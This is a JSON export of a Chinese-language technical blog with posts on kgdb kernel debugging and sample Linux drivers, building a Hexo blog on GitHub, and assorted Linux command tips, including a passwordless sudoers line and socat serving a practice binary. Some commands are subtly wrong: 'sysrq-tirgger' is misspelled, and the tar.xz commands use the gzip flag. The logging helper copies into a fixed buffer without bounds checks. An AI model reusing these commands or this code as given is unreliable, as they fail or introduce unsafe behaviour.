开始调试如果grub没有配置”kgdbwait”参数, 就在被调试机开机后输入 1echo g &gt;/proc/sysrq-tirgger 在调试机里 1234567891011$ gdb linux-3.18.34&#x2F;vmlinux.....(gdb) set remotebaud 115200(gdb) target remote &#x2F;dev&#x2F;ttyS0Remote debugging using &#x2F;dev&#x2F;ttyS0kgdb_breakpoint () at kernel&#x2F;kgdb.c:16741674 wmb(); &#x2F;*Sync point after breakpoint *&#x2F;warning: shared library handler failed to enable breakpoint(gdb) 如果”set remotebaud 115200”的时候出错,就换成”set serial baud 115200” 调试自定义驱动首先是编译好驱动, 在此不讨论.一个简单的驱动文件可以是如下形式(test.c): 12345678910111213141516171819#include &lt;linux/module.h&gt; #include &lt;asm/io.h&gt; #include &lt;linux/slab.h&gt;#include &lt;linux/ioport.h&gt; MODULE_LICENSE(\"GPL\"); int my_module_init(void)&#123; printk(\"module init done\\n\"); return 0;&#125;void my_module_exit(void)&#123; printk(\"module exit\\n\"); return;&#125;module_init( my_module_init );//声明初始化函数module_exit( my_module_exit ); Makefile 文件内容如下: 12345678obj-m +&#x3D; test.omymodule-objs:&#x3D;module KDIR:&#x3D;&#x2F;lib&#x2F;modules&#x2F;$(shell uname -r)&#x2F;buildMAKE:&#x3D;make default: $(MAKE) -C $(KDIR) SUBDIRS&#x3D;$(PWD) modules clean: $(MAKE) -C $(KDIR) SUBDIRS&#x3D;$(PWD) clean 注意, $(MAKE)前是tab, 不是空格! 如果想在加载驱动时拦截, 可以考虑在module_init里的入口函数处添加一个int3断点 asm(&quot;.byte 0xcc&quot;);实现.如果想带符号, 假设我们要调试带符号的kvm.ko驱动, 首先在被调试机上通过cat /proc/modules|grep获取驱动基址: 123root@ubuntu:&#x2F;home&#x2F;vv# cat &#x2F;proc&#x2F;modules |grep kvmkvm_intel 294912 0 - Live 0xffffffffc066c000kvm 843776 1 kvm_intel, Live 0xffffffffc055e000 此处可以看到, kvm的基址是0xffffffffc055e000.然后通过echo g &gt;/proc/sysrq-tirgger 使内核中断.然后在调试器里输入以下命令添加符号: 12345gdb$ add-symbol-file arch&#x2F;x86&#x2F;kvm&#x2F;kvm.ko 0xffffffffc055e000add symbol table from file &quot;arch&#x2F;x86&#x2F;kvm&#x2F;kvm.ko&quot; at .text_addr &#x3D; 0xffffffffc055e000Reading symbols from arch&#x2F;x86&#x2F;kvm&#x2F;kvm.ko...gdb$ 这代表我们添加成功了. 也可以索引到kvm的符号了. 一个简单的网卡设备驱动的形式大致如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137#include &lt;asm/dma.h&gt;#include &lt;asm/page.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/pci.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/random.h&gt;#include &lt;linux/pci_ids.h&gt;#include &lt;linux/delay.h&gt;#define LOG \"MYMOD:\"char e1000_driver_name[] = \"t_e1000e\";static const struct pci_device_id e1000_pciid_table[] = &#123; &#123; PCI_VDEVICE(INTEL, 0x10D3), 3 &#125;,//E1000_DEV_ID_82574L) , board_82574 &#123;0&#125;&#125;;struct E1000_ADAPTER &#123; u8 *hw_addr0; u8 *hw_addr1;&#125; *adapter=NULL;#define LOGTAG \"TEST: \"void klog(char *fmt, ...)&#123; char textbuf[1024-32]; va_list args; u32 len = 0; char *tmp = fmt; va_start(args, fmt); while(*tmp)&#123; len++; tmp++; &#125; memcpy(textbuf, LOGTAG, sizeof(LOGTAG)-1); memcpy(textbuf + sizeof(LOGTAG) - 1, fmt, len); memcpy(textbuf + sizeof(LOGTAG) + len - 1, \"\\n\", 2); vprintk(textbuf, args); va_end(args); return ;&#125;static int e1000_probe_device(struct pci_dev *pdev, const struct pci_device_id *id)&#123; unsigned long mmio_start, mmio_len; u64 dma; int err = pci_enable_device_mem(pdev); printk(\"probe device\\n\"); if(err)&#123; printk(LOG\"fail to enable device!\\n\"); return err; &#125; err = pci_request_selected_regions_exclusive(pdev, pci_select_bars(pdev, 0x200), e1000_driver_name);//IORESOURCE_MEM if (err) &#123; printk(LOG\"Failed to request region for adapter\\n\"); return err; &#125; adapter=dma_zalloc_coherent(&amp;pdev-&gt;dev, sizeof(struct E1000_ADAPTER), &amp;dma, GFP_KERNEL);; if(!adapter)&#123; printk(LOG\"Failed to alloc adapter\\n\"); return -1; &#125; pci_set_master(pdev); mmio_start = pci_resource_start(pdev, 0);// 因为e1000网卡有两个bar,所以此处需要映射bar0和bar1 mmio_len = pci_resource_len(pdev, 0); adapter-&gt;hw_addr0 = ioremap(mmio_start, mmio_len); if (!adapter-&gt;hw_addr0) &#123; printk(\"Map 0 fail\\n\"); return 0; &#125; mmio_start = pci_resource_start(pdev, 1); mmio_len = pci_resource_len(pdev, 1); adapter-&gt;hw_addr1 = ioremap(mmio_start, mmio_len); if (!adapter-&gt;hw_addr1) &#123; printk(\"Map 1 fail\\n\"); return 0; &#125; e1000_start(pdev); return 0;&#125;void e1000_remove_device(struct pci_dev *pdev)&#123; printk(\"removed device!\\n\"); if(adapter)&#123; if(adapter-&gt;hw_addr0) iounmap(adapter-&gt;hw_addr0); if(adapter-&gt;hw_addr1) iounmap(adapter-&gt;hw_addr1); &#125; pci_release_selected_regions(pdev, pci_select_bars(pdev, 0x200));//IORESOURCE_MEM pci_disable_device(pdev);&#125;void e1000_shutdown_device(struct pci_dev *pdev)&#123; //do nothing return;&#125;static struct pci_driver e1000_driver = &#123; .name = e1000_driver_name, .id_table = e1000_pciid_table, .probe = e1000_probe_device, .remove = e1000_remove_device, .shutdown = e1000_shutdown_device,&#125;;int main_init(void)&#123; int err = pci_register_driver(&amp;e1000_driver); printk(LOG\"mod init!\\n\"); return err;&#125;void main_exit(void)&#123; pci_unregister_driver(&amp;e1000_driver); printk(LOG\"mod exit!\\n\"); if(adapter)&#123; kfree(adapter); &#125; return;&#125;module_init(main_init);module_exit(main_exit);","categories":[],"tags":[]},{"title":"使用github搭建自己的博客","slug":"build-blog","date":"2020-03-29T03:25:13.016Z","updated":"2020-04-13T06:41:53.202Z","comments":true,"path":"2020/03/29/build-blog/","link":"","permalink":"http://474172261.github.io/2020/03/29/build-blog/","excerpt":"","text":"首先你需要在github创建一个仓储 安装git,npmwindows下载node.js下载git 安装hexo1npm install hexo --save (或者npm install hexo-cli -g) 初始化12hexo init MYBLOGcd MYBLOG “MYBLOG”是目录名称 测试123$ hexo generate$ hexo serverINFO Hexo is running at http:&#x2F;&#x2F;localhost:4000 . Press Ctrl+C to stop. 浏览器访问http://localhost:4000 添加主题访问主题库添加主题, 我比较喜欢Apollo 不过不更新了, 暂时用 next 主题. 配置github推送获取链接修改MYBLOG/_config.yml文件 创建sshkey在git-bash里面使用如下指令（通过在Hexo文件夹右键选择 “Git bash here”打开） 1ssh-keygen -t rsa -b 4096 -C &quot;邮件地址@youremail.com&quot; 然后根据提示enter就好(注意文件保存的位置！！) 登录github, 在Account Settings—&gt;SSH Public keys —&gt; add another public keys中添加你的sshkey.pub文件的内容 测试key 1ssh -T git@github.com 新建文章1hexo n \"网站标题\" 文章文件在Hexo\\source_posts里面，后缀为md这是一个markdown文件，具体语法查看markdown语法 文章内容： title: 文章名date: 2013-05-29 07:56:29 #发表日期updated: 2016-04-06 14:58:03 #更新日期categories: Life #文章分类description: 你对本页的描述tags: [tag1,tag2] #文章标签. 多标签时使用英文逗号隔开photos: #如果使用Fancybox（文章头部展示图片）. 如此设置 URL1URL2#从这里开始 #就是正文 #使用markdown 推送文章1hexo d -g d 是deploy缩写 绑定域名 申请域名 添加选项 在github项目根目录添加CNAME文件, 内容为你的域名(比如 xxx.com) 进入github setting查看往下拉, 出现如下结果就成功了 在文章中添加图片第一种: 是在MYBLOG\\source目录下的images目录里添加图片, 这样在首页也能引用比如文件结构如下: MYBLOG\\source\\images├── b.jpga.jpg 使用![ii1](/a.jpg), ![ii2](/images/b.jpg)引用即可 第二种: 1npm install https://github.com/CodeFalling/hexo-asset-image --save 假设MYBLOG\\source\\_posts里面的结构如下:firstblog├── apppicker.jpg├── logo.jpg└── rules.jpgfirstblog.md目录名必须与md文件名一致, 使用 ![](firstblog/logo.jgp)就可以了.","categories":[],"tags":[]},{"title":"Linux 使用技巧","slug":"linux-skill","date":"2020-03-28T23:53:23.767Z","updated":"2020-04-13T06:37:17.776Z","comments":true,"path":"2020/03/29/linux-skill/","link":"","permalink":"http://474172261.github.io/2020/03/29/linux-skill/","excerpt":"","text":"不定期更新 两个linux文件互传1$ scp -r linux-2.6.26 root@(目标ip)IP:/usr/src/(假设放到/usr/src路径) 将一个本地程序做成一个本地服务程序1$ socat tcp-l:2333,reuseaddr,fork exec:./pwn1 服务端口在2333，使用nc 127.0.0.1 2333连接 快速转换图片格式，修改分辨率12$ convert -resize 100x100 src.jpg dst.jpg$ convert -resize 50%x50% src.jpg dst.jpg 修改文件的用户12345678查看归属：$ ls -l file赋给用户hv$ chown hv:hv file如果需要把某个文件夹下所有都付给某个用户$ chown hv:hv -R dir/* 修改terminal的显示路径1$ vim ~/.bashrc 找到 1234## If this is an xterm set the title to user@host:dircase “$TERM” inxterm|rxvt)PS1&#x3D;”\\e]0;$debianchroot:+($debianchroot)\\u@\\h:\\w\\a$PS1” 将PS1那行修改为(其实就是把w换成W) 1PS1&#x3D;”[\\u@\\h:\\W]\\\\$” 添加环境变量1export PATH=$PATH:/home/victorv 创建terminal的快捷键如果是在kali，terminal是没有快捷键的，到设置的keyboard里面，添加自定义快捷键，键值为 1gnome-terminal 或者安装nautilus-open-terminal gdb改变汇编代码显示方式1(gdb) set disas intel 设置反汇编代码使用的指令集，可选择 intel 指令集或 AT&amp;T指令集. usb驱动相关1234567891011121314查找usb驱动$ sudo lspci…02:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111/8168B PCI Express Gigabit Ethernet controller (rev 01)$ find /sys | grep drivers.*02:00获取usb设备信息lsusb -tcat /proc/bus/usb/deviceslshw卸载usb驱动tree /sys/bus/usb/driversecho -n “1-1:1.0” &gt; /sys/bus/usb/drivers/ub/unbind centos安装内核header1yum install kernel-devel-$(uname -r) kernel-headers-$(uname -r) 如果遇到没有搜索结果, 可以做如下操作: 查看当前版本12[root@centos~]# cat /etc/redhat-releaseCentOS release 5.6 (Final) 修改文件/etc/yum.repos.d/CentOS-Vault.repo12345678910111213[C(Your Version Number)-base] 比如 [C5.6-base]name&#x3D;CentOS-(Your Version Number) - Basebaseurl&#x3D;http:&#x2F;&#x2F;vault.centos.org&#x2F;(Your Version Number)&#x2F;os&#x2F;$basearch&#x2F;gpgcheck&#x3D;1gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-CentOS-5enabled&#x3D;1[C(Your Version Number-updates]name&#x3D;CentOS-(Your Version Number) - Updatesbaseurl&#x3D;http:&#x2F;&#x2F;vault.centos.org&#x2F;(Your Version Number)&#x2F;updates&#x2F;$basearch&#x2F;gpgcheck&#x3D;1gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-CentOS-5enabled&#x3D;1 之后再试一次install即可. 更多参考Finding Old kernel-devel Packages For CentOS 添加sudoer 并且取消密码12superuser ALL=(ALL) NOPASSWD:ALLsuperuser ALL=(ALL:ALL) ALL #不取消密码 创建ssh服务12345$ yum -y install openssh-server openssh-clients$ chkconfig sshd on$ service sshd start$ netstat -tulpn | grep :22$ vi /etc/sysconfig/iptables -A RH-Firewall-1-INPUT -m state –state NEW -m tcp -p tcp –dport 22 -j ACCEPT 创建ftp 服务123sudo yum install vsftpdsudo service vsftpd restartchkconfig vsftpd on ubuntu修改内核调试启动项1vi /etc/default/grub 在屁股后面添加 kgdboc=ttyS1,115200 12grep menu /boot/grub/grub.cfggrub-reboot ‘1&gt;3’ 第一个数字1代表第二行的submenu，第二个3代表submenu的第四个（从0开始） 挂起一个进程ctrl+zfg 恢复 打包、解压文件解包使用x,打包使用c tar.xz解包:tar zxvf file.tar.xz 或者:xz -d file.tar.xz &amp;&amp; tar xvf file.tar打包:tar zcvf file.tar.xz .tar解包：tar xvf FileName.tar打包：tar cvf FileName.tar DirName（注：tar是打包，不是压缩！）———————————————.gz解压1：gunzip FileName.gz解压2：gzip -d FileName.gz压缩：gzip FileName .tar.gz 和 .tgz解压：tar zxvf FileName.tar.gz压缩：tar zcvf FileName.tar.gz DirName———————————————.bz2解压1：bzip2 -d FileName.bz2解压2：bunzip2 FileName.bz2压缩： bzip2 -z FileName .tar.bz2解压：tar jxvf FileName.tar.bz2压缩：tar jcvf FileName.tar.bz2 DirName———————————————.bz解压1：bzip2 -d FileName.bz解压2：bunzip2 FileName.bz压缩：未知 .tar.bz解压：tar jxvf FileName.tar.bz压缩：未知———————————————.Z解压：uncompress FileName.Z压缩：compress FileName.tar.Z 解压：tar Zxvf FileName.tar.Z压缩：tar Zcvf FileName.tar.Z DirName———————————————.zip解压：unzip FileName.zip压缩：zip FileName.zip DirName———————————————.rar解压：rar x FileName.rar压缩：rar a FileName.rar DirName———————————————.lha解压：lha -e FileName.lha压缩：lha -a FileName.lha FileName———————————————.rpm解包：rpm2cpio FileName.rpm | cpio -div———————————————.deb解包：ar p FileName.deb data.tar.gz | tar zxf -———————————————.tar .tgz .tar.gz .tar.Z .tar.bz .tar.bz2 .zip .cpio .rpm .deb .slp .arj .rar .ace .lha .lzh .lzx .lzs .arc .sda .sfx .lnx .zoo .cab .kar .cpt .pit .sit .sea解压：sEx x FileName.*压缩：sEx a FileName.* FileName 单独重新编译一个内核模块当我们想修改内核某个模块,又不想重新make all的时候,可以这样操作. 1make drivers&#x2F;net&#x2F;ethernet&#x2F;intel&#x2F;e1000&#x2F;e1000.ko 或者 1make drivers&#x2F;net&#x2F;ethernet&#x2F;intel&#x2F;e1000&#x2F;","categories":[],"tags":[]}],"categories":[],"tags":[]}